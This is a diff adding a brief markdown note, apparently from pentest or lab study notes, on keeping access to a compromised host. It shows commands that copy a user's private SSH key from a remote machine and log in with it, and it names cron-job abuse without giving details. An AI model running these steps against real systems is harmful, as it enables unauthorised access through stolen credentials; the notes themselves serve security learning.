@@ -1,0 +1,20 @@
+#### Persistence : Maintaining Access
+
+
+
+> - Exemple 1 : Steal id_rsa and connect with this key : 
+>   
+>   `scp student@192.37.104.3:~/.ssh/id_rsa`
+>   
+>   `chmod 400 id_rsa `
+>   `ssh -i id_rsa student@192.37.104.3`
+
+
+
+
+
+> - Exemple 2 : Abuse cron job 
+
+
+
+
